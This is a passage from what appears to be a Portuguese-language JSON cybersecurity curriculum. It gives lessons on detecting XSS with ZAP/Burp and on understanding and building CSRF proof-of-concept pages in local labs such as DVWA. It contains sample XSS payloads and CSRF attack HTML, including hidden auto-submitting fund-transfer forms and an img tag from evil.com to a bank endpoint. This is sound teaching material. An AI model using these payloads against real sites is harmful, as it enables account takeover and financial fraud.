                                    "Proxy mal configurado levando a bypass de interceptação.",
                                    "Ignorar HTTPS, perdendo payloads criptografados.",
                                    "Não mapear o site, faltando endpoints ocultos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Exploração Manual e Scan Passivo por XSS",
                                  "subSteps": [
                                    "Identificar inputs refletidos: campos de busca, comentários, parâmetros URL.",
                                    "Testar payloads XSS manuais como <script>alert(1)</script> ou '><img src=x onerror=alert(1)> via proxy repeater.",
                                    "Usar o Passivo Scanner do ZAP/Burp para alertas automáticos de potenciais XSS em responses.",
                                    "Dropar e modificar requests para fuzzing básico de payloads OWASP XSS Cheat Sheet.",
                                    "Registrar evidências de execução (alert pop-up ou DOM manipulação)."
                                  ],
                                  "verification": "Payloads XSS executam na app (ex: alert box aparece), e alerts passivos listados no dashboard.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OWASP XSS Cheat Sheet (imprimir ou bookmark)",
                                    "Lista de payloads comuns"
                                  ],
                                  "tips": [
                                    "Comece com payloads não-destrutivos para evitar quebras na app.",
                                    "Use repeater para iterar rapidamente."
                                  ],
                                  "learningObjective": "Identificar e explorar manualmente vulnerabilidades XSS em pontos de entrada.",
                                  "commonMistakes": [
                                    "Payloads mal codificados (ex: faltando aspas).",
                                    "Não verificar contextos DOM/Browser/Attribute.",
                                    "Confundir refletido com armazenado."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Scan Ativo Automatizado para XSS",
                                  "subSteps": [
                                    "Selecionar o contexto/site no ZAP ou Burp e iniciar Active Scan com regras XSS ativadas.",
                                    "Configurar intensidade média para balancear velocidade e cobertura.",
                                    "Monitorar progresso e pausar se necessário para evitar DoS na app alvo.",
                                    "Revisar alerts gerados: risco alto/médio para XSS variants (reflected, DOM, stored).",
                                    "Executar AJAX Spider se app for single-page (SPA)."
                                  ],
                                  "verification": "Scan completa com alerts XSS listados, incluindo risk level e confidence.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "App alvo rodando localmente",
                                    "ZAP Active Scanner ruleset atualizado"
                                  ],
                                  "tips": [
                                    "Limite scan a URLs específicas para eficiência.",
                                    "Atualize rulesets OWASP regularmente."
                                  ],
                                  "learningObjective": "Automatizar detecção de XSS com scans ativos precisos.",
                                  "commonMistakes": [
                                    "Scan agressivo derrubando app frágil.",
                                    "Ignorar low confidence alerts que podem ser verdadeiros positivos.",
                                    "Não customizar rules para contextos específicos."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados, Validar e Gerar Relatório",
                                  "subSteps": [
                                    "Triangular achados: manual + passivo + ativo para confirmar true positives.",
                                    "Reproduzir vulnerabilidades com PoC (Proof of Concept) scripts ou screenshots.",
                                    "Classificar por OWASP Risk Rating: likelihood/impact.",
                                    "Recomendar mitigações: CSP, input sanitization, output encoding.",
                                    "Exportar relatório em HTML/PDF com evidências."
                                  ],
                                  "verification": "Relatório gerado com pelo menos 2-3 XSS validadas, PoCs e recomendações.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de relatório pentest",
                                    "Ferramentas screenshot como Flameshot"
                                  ],
                                  "tips": [
                                    "Use Burp Collaborator para detectar out-of-band XSS.",
                                    "Priorize high-risk alerts."
                                  ],
                                  "learningObjective": "Validar achados e comunicar riscos de forma profissional.",
                                  "commonMistakes": [
                                    "Aceitar todos alerts como verdadeiros (falsos positivos altos).",
                                    "Relatório vago sem PoCs.",
                                    "Omitir variantes como DOM XSS."
                                  ]
                                }
                              ],
                              "practicalExample": "Instale DVWA localmente via XAMPP. Configure ZAP proxy, navegue para login DVWA, escaneie ativamente a seção 'XSS (Reflected)'. Identifique vuln em campo 'name', valide com payload <script>alert('XSS')</script>, confirme alert pop-up e gere relatório com screenshot.",
                              "finalVerifications": [
                                "Configuração proxy captura todo tráfego HTTPS sem erros.",
                                "Scan ativo detecta pelo menos 3 tipos de XSS em app vulnerável.",
                                "Validação manual confirma true positives com PoC executável.",
                                "Relatório inclui risk ratings OWASP e mitigações específicas.",
                                "Diferenciação clara entre reflected, stored e DOM-based XSS.",
                                "Nenhuma falha de segurança no ambiente de teste (ex: exposição de proxy)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração (100% tráfego interceptado).",
                                "Cobertura completa: manual + automatizado (mínimo 80% endpoints escaneados).",
                                "Qualidade da validação (zero falsos negativos em vulns conhecidas).",
                                "Relatório profissional com evidências visuais e recomendações acionáveis.",
                                "Tempo de execução dentro do estimado com eficiência.",
                                "Conhecimento demonstrado de variantes XSS e OWASP rules."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Entender HTML/JS para crafting payloads.",
                                "Redes: Conceitos de proxy, MITM e tráfego HTTP/HTTPS.",
                                "Ética e Direito: Regras de engajamento em pentests autorizados.",
                                "Programação: Automatizar scans com ZAP API ou Burp Extensions em Python.",
                                "Análise de Dados: Interpretar logs e métricas de scanner."
                              ],
                              "realWorldApplication": "Em penetration testing profissional (ex: empresas como Google ou bancos), pentesters usam ZAP/Burp para auditar sites antes de produção, identificando XSS que poderiam roubar cookies/sessões de usuários, prevenindo breaches como o de 2018 no British Airways (comprometendo 380k cartões)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.3",
                    "name": "Cross-Site Request Forgery (CSRF)",
                    "description": "Exploração de sessões autenticadas para forçar ações não autorizadas em sites confiáveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.3.1",
                        "name": "Funcionamento do Ataque CSRF",
                        "description": "Compreensão do mecanismo pelo qual um site malicioso explora a sessão autenticada de um usuário em um site confiável para executar ações não autorizadas, como transferências financeiras ou alterações de configurações.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.1.1",
                            "name": "Definir e exemplificar CSRF",
                            "description": "Explicar o conceito de Cross-Site Request Forgery (CSRF) como uma exploração de credenciais de sessão armazenadas em cookies, identificando exemplos reais como formulários ocultos em sites maliciosos que disparam requisições POST para sites confiáveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Definição Básica de CSRF",
                                  "subSteps": [
                                    "Pesquise a definição oficial de Cross-Site Request Forgery (CSRF) em fontes confiáveis como OWASP.",
                                    "Identifique os elementos chave: ataque que explora credenciais de sessão autenticadas.",
                                    "Escreva a definição em suas próprias palavras, destacando que não requer roubo de credenciais.",
                                    "Compare CSRF com autenticação baseada em cookies de sessão.",
                                    "Registre 3 sinônimos ou termos relacionados (ex: XSRF, Sea Surf)."
                                  ],
                                  "verification": "Você pode recitar a definição corretamente e explicar por que ela é uma 'exploração de confiança'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Página OWASP CSRF",
                                    "Bloco de notas"
                                  ],
                                  "tips": "Use analogias como 'um invasor usando seu cartão de crédito porque você o deixou na mesa'.",
                                  "learningObjective": "Definir CSRF com precisão, diferenciando-o de outros ataques web.",
                                  "commonMistakes": [
                                    "Confundir CSRF com XSS (CSRF não injeta scripts)",
                                    "Achar que CSRF requer phishing de senhas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Papel dos Cookies de Sessão no CSRF",
                                  "subSteps": [
                                    "Revise como funcionam cookies de sessão: Set-Cookie no login, enviado automaticamente em requisições.",
                                    "Simule uma sessão autenticada abrindo dev tools no navegador e observando cookies.",
                                    "Explique por que navegadores enviam cookies para domínios confiáveis mesmo de origens maliciosas.",
                                    "Desenhe um diagrama simples: Usuário logado -> Site malicioso -> Requisição forjada ao banco.",
                                    "Teste enviando uma requisição cross-site manual via curl ou Postman."
                                  ],
                                  "verification": "Desenhe e explique um fluxograma mostrando o envio automático de cookies.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador com DevTools (Chrome/Firefox)",
                                    "Ferramenta Postman ou curl",
                                    "Papel e caneta"
                                  ],
                                  "tips": "Ative 'Preserve log' no DevTools para ver requisições cross-origin.",
                                  "learningObjective": "Explicar como cookies de sessão habilitam CSRF sem interação do usuário.",
                                  "commonMistakes": [
                                    "Ignorar SameSite cookies como mitigação",
                                    "Pensar que CSRF afeta apenas GET requests"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Exemplos Reais de Ataques CSRF",
                                  "subSteps": [
                                    "Estude o exemplo clássico: Formulário oculto em site malicioso com <img src> ou <form> POST para /transferir.",
                                    "Analise um case real, como o ataque ao site de um banco via email com link malicioso.",
                                    "Use OWASP CSRF cheat sheet para listar 3 variantes (ex: JSON-based, AJAX).",
                                    "Capture tráfego de rede simulando um ataque em ambiente local (ex: DVWA).",
                                    "Documente o payload HTML malicioso: <form action='https://bank.com/transfer' method='POST'>."
                                  ],
                                  "verification": "Crie e descreva um exemplo HTML funcional de CSRF PoC.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OWASP CSRF Cheat Sheet",
                                    "DVWA ou lab local (XAMPP)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Teste em localhost para evitar riscos reais; use VPN se necessário.",
                                  "learningObjective": "Reconhecer padrões de ataques CSRF em cenários reais.",
                                  "commonMistakes": [
                                    "Usar HTTPS no PoC sem notar que CSRF ignora isso",
                                    "Esquecer origin checking falha em CSRF"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Exemplificar e Sintetizar CSRF em um Cenário Próprio",
                                  "subSteps": [
                                    "Crie um exemplo personalizado: Usuário logado em e-commerce, site malicioso força compra.",
                                    "Escreva o código HTML/JS do atacante e explique o fluxo completo.",
                                    "Simule a defesa ausente (sem token CSRF) e como falha.",
                                    "Discuta impactos: Alteração de dados, ações não autorizadas.",
                                    "Resuma em um relatório de 1 página com definição, mecanismo e exemplo."
                                  ],
                                  "verification": "Apresente seu exemplo e explique para um par ou grave um vídeo curto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor HTML (VS Code)",
                                    "Servidor local",
                                    "Gravação de tela opcional"
                                  ],
                                  "tips": "Mantenha simples: Foque em POST sem token anti-CSRF.",
                                  "learningObjective": "Aplicar conceitos para criar e exemplificar um ataque CSRF realista.",
                                  "commonMistakes": [
                                    "Incluir token CSRF acidentalmente",
                                    "Confundir com clickjacking"
                                  ]
                                }
                              ],
                              "practicalExample": "Imagine um usuário logado em seu banco online via cookie de sessão. Ele visita um site de piadas malicioso que carrega um iframe oculto com <form action='https://seubanco.com/transferir?valor=1000&conta=atacante' method='POST' style='display:none'><input type='submit'></form> e um script que submete automaticamente. O navegador envia o cookie válido, transferindo R$1000 sem consentimento.",
                              "finalVerifications": [
                                "Defina CSRF em 1 frase correta.",
                                "Explique o papel dos cookies de sessão com diagrama.",
                                "Identifique 2 exemplos reais de payloads CSRF.",
                                "Diferencie CSRF de XSS e session hijacking.",
                                "Crie um PoC HTML funcional.",
                                "Liste 3 mitigações básicas (tokens, SameSite)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição (sem confusões com outros ataques).",
                                "Clareza no mecanismo de cookies e requisições cross-site.",
                                "Qualidade e realismo dos exemplos fornecidos.",
                                "Completude dos fluxogramas e PoCs.",
                                "Capacidade de explicar verbalmente o conceito.",
                                "Identificação correta de erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Desenvolvimento de formulários seguros (HTML/JS).",
                                "Redes: Análise de tráfego HTTP/HTTPS com Wireshark.",
                                "Ética e Direito: Legislação de cibersegurança (LGPD, crimes cibernéticos).",
                                "Matemática: Probabilidades de ataques em sessões autenticadas.",
                                "Comunicação: Relatórios técnicos de vulnerabilidades."
                              ],
                              "realWorldApplication": "Desenvolvedores web usam tokens CSRF em frameworks como Django ou Spring para prevenir fraudes em bancos online, e-commerces e redes sociais, protegendo milhões de usuários de ações não autorizadas como transferências financeiras ou alterações de perfil."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.2",
                            "name": "Analisar o fluxo de um ataque CSRF",
                            "description": "Descrever o fluxo completo de um ataque CSRF, desde a autenticação do usuário no site vítima, carregamento de página maliciosa, envio automático de requisição forjada e execução da ação indesejada sem consentimento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a autenticação inicial do usuário no site vítima",
                                  "subSteps": [
                                    "Explique como o usuário faz login no site legítimo (ex: banco online) usando credenciais.",
                                    "Descreva a emissão de um cookie de sessão pelo servidor após autenticação bem-sucedida.",
                                    "Identifique que o cookie é enviado automaticamente em requisições subsequentes ao mesmo domínio.",
                                    "Anote que o navegador armazena o cookie de forma persistente para a sessão.",
                                    "Registre o estado: usuário autenticado, cookie presente."
                                  ],
                                  "verification": "Desenhe um diagrama simples mostrando login e cookie sendo setado; confira se o cookie aparece nas dev tools do browser.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Navegador com DevTools (Chrome/Firefox)",
                                    "Site de teste vulnerável como DVWA ou similar"
                                  ],
                                  "tips": "Use DevTools > Application > Cookies para visualizar o cookie de sessão em tempo real.",
                                  "learningObjective": "Entender como sessões são mantidas via cookies após autenticação.",
                                  "commonMistakes": [
                                    "Confundir cookies de sessão com autenticação básica",
                                    "Ignorar que cookies são enviados automaticamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregamento da página maliciosa pelo usuário",
                                  "subSteps": [
                                    "Descreva o usuário navegando para um site legítimo mas comprometido (ex: blog com comentário malicioso).",
                                    "Explique o carregamento de HTML/JS da página maliciosa no navegador do usuário.",
                                    "Identifique elementos ocultos como formulários hidden ou scripts que preparam a requisição.",
                                    "Note que o cookie de sessão do site vítima permanece no navegador, mas não é acessível cross-domain.",
                                    "Registre o momento: usuário ainda autenticado no site vítima."
                                  ],
                                  "verification": "Abra uma página HTML local com script malicioso e verifique no Network tab se elementos carregam sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto para criar HTML malicioso simples",
                                    "DevTools Network tab"
                                  ],
                                  "tips": "Teste em localhost para evitar problemas de CORS inicialmente.",
                                  "learningObjective": "Reconhecer como páginas maliciosas exploram confiança do usuário sem roubar credenciais.",
                                  "commonMistakes": [
                                    "Pensar que JS pode ler cookies cross-domain diretamente",
                                    "Subestimar o papel do Same-Origin Policy"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Envio automático da requisição forjada",
                                  "subSteps": [
                                    "Descreva o script na página maliciosa criando uma requisição POST para o site vítima (ex: /transferir).",
                                    "Explique como o formulário hidden é submetido via JS (submit() ou XMLHttpRequest).",
                                    "Identifique que o cookie de sessão é anexado automaticamente pela browser à requisição.",
                                    "Note a ausência de token CSRF na requisição forjada.",
                                    "Registre parâmetros maliciosos como conta_destino e valor_transferencia."
                                  ],
                                  "verification": "Execute o script malicioso e capture a requisição no Network tab; confirme cookie e parâmetros corretos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "HTML/JS de exemplo para CSRF",
                                    "Proxy como Burp Suite ou Fiddler para inspecionar"
                                  ],
                                  "tips": "Desabilite CSRF protection temporariamente em ambiente de teste para simular sucesso.",
                                  "learningObjective": "Analisar como requisições forjadas herdam credenciais de sessão.",
                                  "commonMistakes": [
                                    "Confundir CSRF com XSS",
                                    "Esquecer que GET pode ser usado mas POST é comum"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Processamento da ação no servidor vítima e impacto",
                                  "subSteps": [
                                    "Descreva o servidor vítima recebendo a requisição com cookie válido.",
                                    "Explique a validação da sessão via cookie e execução da ação (ex: transferência de fundos).",
                                    "Identifique a falta de verificação de origem ou token CSRF permitindo a execução.",
                                    "Note o usuário vítima não consentindo ou percebendo a ação.",
                                    "Registre o resultado: ação indesejada executada com privilégios do usuário."
                                  ],
                                  "verification": "Confira logs do servidor ou banco de dados para evidência da ação executada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Servidor de teste vulnerável (ex: Node.js/Express simples)",
                                    "Logs de aplicação"
                                  ],
                                  "tips": "Use um endpoint de log para rastrear requisições e ações.",
                                  "learningObjective": "Compreender por que o servidor confia na requisição baseada apenas na sessão.",
                                  "commonMistakes": [
                                    "Achar que HTTPS previne CSRF",
                                    "Ignorar ações state-changing em GET"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Diagramar e sintetizar o fluxo completo do ataque",
                                  "subSteps": [
                                    "Crie um diagrama sequencial (user -> malicioso -> vítima) com setas e labels.",
                                    "Revise todos os passos anteriores e conecte-os logicamente.",
                                    "Identifique pontos de mitigação potenciais (ex: token CSRF).",
                                    "Explique o fluxo em voz alta ou por escrito.",
                                    "Compare com fluxos reais documentados (ex: OWASP)."
                                  ],
                                  "verification": "Compartilhe o diagrama com um par para validação ou auto-avaliação contra referência OWASP.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io ou papel/caneta",
                                    "Referência OWASP CSRF"
                                  ],
                                  "tips": "Use cores para diferenciar cliente, atacante e vítima.",
                                  "learningObjective": "Sintetizar o fluxo CSRF em uma visão holística acionável.",
                                  "commonMistakes": [
                                    "Omitir o papel do cookie automático",
                                    "Confundir com clickjacking"
                                  ]
                                }
                              ],
                              "practicalExample": "Um usuário logado em seu banco online (sitevima.com) visita um fórum hackeado. O fórum carrega um IMG tag disfarçado que faz POST para sitevima.com/transferir?conta=atacante&valor=1000. O cookie de sessão é enviado, transferindo R$1000 sem consentimento.",
                              "finalVerifications": [
                                "Pode listar os 4 passos principais do fluxo CSRF em ordem?",
                                "Explica corretamente o papel do cookie de sessão?",
                                "Identifica por que a requisição forjada é aceita pelo servidor?",
                                "Desenha um diagrama preciso do fluxo?",
                                "Distingue CSRF de outros ataques como XSS?",
                                "Sugere pelo menos uma mitigação básica?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência temporal do fluxo (100% dos passos corretos)",
                                "Uso correto de terminologia técnica (cookie, sessão, POST forjado)",
                                "Profundidade nos sub-passos e verificações práticas",
                                "Clareza no diagrama ou descrição visual",
                                "Identificação de erros comuns e prevenções",
                                "Conexão com impacto real no usuário"
                              ],
                              "crossCurricularConnections": [
                                "Protocolos HTTP/HTTPS e cabeçalhos (Network Fundamentals)",
                                "Gerenciamento de estado em aplicações web (Cookies/Sessões)",
                                "Desenvolvimento Front-end (HTML/JS para simulações)",
                                "Ética e conformidade (GDPR, OWASP Top 10)",
                                "Análise de redes e tráfego (Wireshark para pacotes)"
                              ],
                              "realWorldApplication": "Desenvolvedores usam essa análise para implementar tokens CSRF synchronizer em forms (ex: Django @csrf_protect), previnindo bilhões em fraudes bancárias anuais; auditores de segurança verificam fluxos em pentests."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.3",
                            "name": "Identificar pré-condições para CSRF",
                            "description": "Reconhecer as condições necessárias para um ataque CSRF bem-sucedido, como uso de cookies sem atributos de segurança, métodos GET/POST vulneráveis e ausência de validação de origem da requisição.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender autenticação baseada em cookies sem atributos de segurança",
                                  "subSteps": [
                                    "Estude como sessões web usam cookies para autenticação automática.",
                                    "Identifique atributos de cookies vulneráveis: ausência de SameSite, Secure e HttpOnly insuficiente para CSRF.",
                                    "Analise exemplos de cookies de sessão enviados automaticamente pelo navegador.",
                                    "Compare cookies seguros vs. inseguros em cenários de cross-site requests.",
                                    "Pratique inspecionando cookies em ferramentas como browser devtools."
                                  ],
                                  "verification": "Liste 3 atributos de cookies que não previnem CSRF e explique por quê.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação OWASP CSRF Prevention Cheat Sheet",
                                    "Browser Developer Tools (Chrome/Firefox)"
                                  ],
                                  "tips": "Sempre verifique o cabeçalho Set-Cookie em respostas HTTP para identificar fraquezas.",
                                  "learningObjective": "Reconhecer como cookies de autenticação sem SameSite permitem que requests cross-site sejam autenticados.",
                                  "commonMistakes": [
                                    "Confundir HttpOnly com proteção total contra CSRF (não previne)",
                                    "Ignorar SameSite=None como vulnerável"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar métodos HTTP vulneráveis (GET e POST simples)",
                                  "subSteps": [
                                    "Revise métodos HTTP: foque em GET para ações críticas (idempotência violada).",
                                    "Examine POST sem tokens: como forms são submetidos sem validação.",
                                    "Analise exemplos de endpoints como /transfer?amount=1000 acessíveis via GET.",
                                    "Teste em labs virtuais: crie um form malicioso que submete POST para site vítima.",
                                    "Documente diferenças entre métodos seguros (PUT/DELETE com validação) e vulneráveis."
                                  ],
                                  "verification": "Crie um diagrama mostrando um request GET vulnerável vs. seguro.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "OWASP WebGoat ou DVWA lab para CSRF",
                                    "Postman ou curl para simular requests"
                                  ],
                                  "tips": "Lembre-se: navegadores permitem prefetch de GET, facilitando ataques invisíveis.",
                                  "learningObjective": "Identificar quando ações mutáveis são expostas via GET/POST sem proteção adicional.",
                                  "commonMistakes": [
                                    "Achar que todos POST são seguros (sem token, não são)",
                                    "Ignorar idempotência em GET"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Reconhecer ausência de validação de origem e tokens CSRF",
                                  "subSteps": [
                                    "Estude tokens CSRF: como sincronizar token por sessão e validá-lo server-side.",
                                    "Analise headers: Origin, Referer e sua confiabilidade limitada.",
                                    "Identifique falta de validação: requests sem checagem de origem aceitos.",
                                    "Pratique: inspecione tráfego de rede em sites reais e vulneráveis.",
                                    "Compare implementações: double-submit cookie vs. token armazenado em sessão."
                                  ],
                                  "verification": "Explique em 2 frases por que Referer pode ser spoofado e como tokens resolvem isso.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Mozilla Developer Network (MDN) docs on CSRF",
                                    "Wireshark ou Burp Suite Community para análise de pacotes"
                                  ],
                                  "tips": "Tokens devem ser únicos por request e ligados à sessão do usuário.",
                                  "learningObjective": "Detectar ausência de mecanismos como tokens anti-CSRF ou validação de headers.",
                                  "commonMistakes": [
                                    "Confundir token CSRF com CAPTCHA",
                                    "Achar que HTTPS previne CSRF (não previne)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar interação vítima-atacante e estado logado",
                                  "subSteps": [
                                    "Descreva fluxo: vítima logada em site A, visita site B malicioso.",
                                    "Identifique pré-condição: vítima deve estar autenticada durante o ataque.",
                                    "Examine triggers: links, imgs, forms hidden em sites atacantes.",
                                    "Simule: use um lab para induzir request cross-site enquanto logado.",
                                    "Liste fatores atenuantes: pop-up blockers ou SameSite=Lax."
                                  ],
                                  "verification": "Monte um checklist de 5 pré-condições completas para CSRF.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "PortSwigger Web Security Academy CSRF lab",
                                    "Vídeos OWASP sobre CSRF flows"
                                  ],
                                  "tips": "Ataque requer vítima ativa e logada; sessões expiradas bloqueiam.",
                                  "learningObjective": "Compreender que CSRF explora confiança implícita em requests autenticados cross-site.",
                                  "commonMistakes": [
                                    "Pensar que atacantes precisam de credenciais da vítima",
                                    "Ignorar necessidade de vítima logada"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app bancário vulnerável (bank.com), o usuário está logado via cookie sem SameSite. O atacante em evil.com cria <img src='https://bank.com/transfer?to=attacker&amount=1000'>. Como o navegador envia o cookie automaticamente, a transferência ocorre sem consentimento.",
                              "finalVerifications": [
                                "Liste verbalmente as 4 pré-condições principais para CSRF.",
                                "Identifique 2 vulnerabilidades CSRF em um código HTML/PHP fornecido.",
                                "Explique por que SameSite=Strict previne o exemplo prático.",
                                "Crie um form malicioso que exploraria um endpoint /profile/update sem token.",
                                "Diferencie CSRF de XSS em um cenário hipotético."
                              ],
                              "assessmentCriteria": [
                                "Precisão na lista de pré-condições (todas 4 corretas).",
                                "Capacidade de mapear fraquezas em exemplos reais de código.",
                                "Explicação clara do fluxo vítima-atacante-site.",
                                "Identificação correta de mitigações ausentes.",
                                "Uso de terminologia técnica precisa (ex: SameSite, token sincronizado).",
                                "Criatividade em exemplos práticos personalizados."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração com HTML/JS para forms e requests.",
                                "Redes e Protocolos: Análise profunda de HTTP headers e cookies.",
                                "Ética e Direito: Implicações legais de ataques CSRF em aplicações reais.",
                                "Análise de Riscos: Avaliação de ameaças em auditorias de segurança."
                              ],
                              "realWorldApplication": "Auditores de segurança usam essa identificação para priorizar testes em apps web como e-commerces e bancos, prevenindo fraudes financeiras reais, como as reportadas em breaches OWASP Top 10."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.2",
                        "name": "Técnicas de Exploração CSRF",
                        "description": "Estudo das formas práticas de implementar ataques CSRF, incluindo vetores comuns como tags HTML maliciosas e integrações com outros ataques como XSS.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.2.1",
                            "name": "Construir prova de conceito (PoC) de CSRF",
                            "description": "Criar um exemplo prático de PoC usando HTML com formulários ocultos ou tags <img> para simular um ataque CSRF em um ambiente de laboratório, demonstrando transferência de fundos ou mudança de email.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de laboratório vulnerável",
                                  "subSteps": [
                                    "Instale um servidor web local como XAMPP, WAMP ou Node.js com Express.",
                                    "Crie um aplicativo web simples com uma página de login e uma página de transferência de fundos que não usa tokens CSRF.",
                                    "Implemente endpoints POST para mudança de email ou transferência sem validação de origem (ex: /transfer?amount=100&to=attacker).",
                                    "Teste o app logando com credenciais de vítima e confirmando que transferências funcionam.",
                                    "Documente as URLs e parâmetros necessários para o ataque."
                                  ],
                                  "verification": "Acesse o app no navegador, faça login e execute uma transferência manualmente para confirmar vulnerabilidade.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Servidor local (XAMPP/Node.js)",
                                    "Editor de código (VS Code)",
                                    "Navegador web (Chrome/Firefox)"
                                  ],
                                  "tips": "Use localhost para isolar o ambiente e evite expor publicamente. Inclua logs no servidor para monitorar requests.",
                                  "learningObjective": "Configurar um ambiente controlado que simule uma aplicação web vulnerável a CSRF.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar tokens CSRF se o framework os usar por padrão.",
                                    "Não testar o endpoint POST manualmente antes de prosseguir.",
                                    "Usar HTTPS em lab desnecessariamente, complicando testes."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e planejar o ataque CSRF",
                                  "subSteps": [
                                    "Inspecione o formulário alvo usando DevTools do navegador para capturar parâmetros (ex: amount, to_account, session cookie).",
                                    "Identifique o método HTTP (POST) e action URL do endpoint vulnerável.",
                                    "Planeje a PoC: decida entre formulário oculto auto-submit ou tag <img> para requests POST simulados.",
                                    "Defina o payload: simule transferência de 1000 unidades para conta atacante ou mudança de email para attacker@example.com.",
                                    "Crie um diagrama simples do fluxo: vítima logada -> abre site malicioso -> request forjado enviado."
                                  ],
                                  "verification": "Registre em um documento os parâmetros exatos (ex: form data) e o tipo de PoC escolhido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Navegador com DevTools",
                                    "Ferramenta de proxy como Burp Suite Community (opcional)",
                                    "Papel ou ferramenta de diagrama (Draw.io)"
                                  ],
                                  "tips": "Sempre capture cookies de sessão; eles são enviados automaticamente em same-site requests.",
                                  "learningObjective": "Compreender os componentes necessários para forjar um request CSRF realista.",
                                  "commonMistakes": [
                                    "Ignorar cookies de sessão, que são cruciais para autenticação.",
                                    "Assumir GET em vez de POST, comum em CSRF.",
                                    "Não considerar SameSite cookies que mitigam CSRF."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver a página PoC HTML maliciosa",
                                  "subSteps": [
                                    "Crie um arquivo HTML com conteúdo inocente (ex: 'Clique para ver meme') para atrair a vítima.",
                                    "Adicione um formulário oculto com action apontando para o endpoint alvo e inputs hidden com payload malicioso.",
                                    "Use JavaScript para auto-submit o form onload: document.forms[0].submit().",
                                    "Alternativa: Use <img src='http://target.com/transfer?to=attacker&amount=1000'> para GET, ou XMLHttpRequest para POST simulado.",
                                    "Hospede a PoC em outro diretório local ou servidor simples (ex: python -m http.server)."
                                  ],
                                  "verification": "Abra a PoC em uma aba sem login e confirme que nenhum request é enviado (use Network tab).",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Servidor local para hospedar PoC",
                                    "Conhecimento básico de HTML/JS"
                                  ],
                                  "tips": "Torne o form invisível com CSS (display:none) e use onload para execução automática.",
                                  "learningObjective": "Construir uma página web que explore CSRF de forma stealthy e acionável.",
                                  "commonMistakes": [
                                    "Esquecer de matching exato de parâmetros (case-sensitive).",
                                    "Não usar método POST correto.",
                                    "Auto-submit falhar por CSP ou mixed-content errors."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar, verificar e documentar o ataque",
                                  "subSteps": [
                                    "Inicie o app vulnerável e faça login como vítima em uma aba.",
                                    "Abra a PoC em outra aba ou link clicável.",
                                    "Monitore logs do servidor e Network tab para confirmar request forjado com cookie de vítima.",
                                    "Verifique impacto: saldo transferido ou email alterado no app.",
                                    "Documente screenshots, código PoC e lições aprendidas."
                                  ],
